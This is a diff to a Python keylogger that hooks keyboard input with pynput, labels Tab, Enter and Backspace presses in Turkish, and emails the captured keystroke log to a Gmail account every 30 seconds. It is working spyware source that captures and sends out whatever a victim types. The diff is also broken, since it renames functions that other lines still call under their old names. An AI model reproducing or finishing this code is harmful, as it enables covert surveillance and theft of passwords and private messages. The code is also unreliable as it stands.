@@ -4,7 +4,7 @@ import threading
 
 log = ""
 
-def callback_function(key):
+def callback_func(key):
     global log
     try:
         #log = log + key.char.encode('utf-8')
@@ -12,6 +12,12 @@ def callback_function(key):
     except AttributeError:
         if key == key.space:
             log = log + " "
+        if key == key.tab:
+            log = log + " Tab'a bastı. "
+        if key == key.enter:
+            log = log + " Enter'a bastı. "
+        if key == key.backspace:
+            log = log + " son karakteri sildi "
         else:
             log = log + str(key)
     except:
@@ -32,7 +38,7 @@ def thread_function():
     global log
     send_email("user@gmail.com", "password", log.encode('utf-8'))
     log = ""
-    timer_object = threading.Timer(30,thread_function)
+    timer_object = threading.Timer(30,thread_func)
     timer_object.start()
 
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
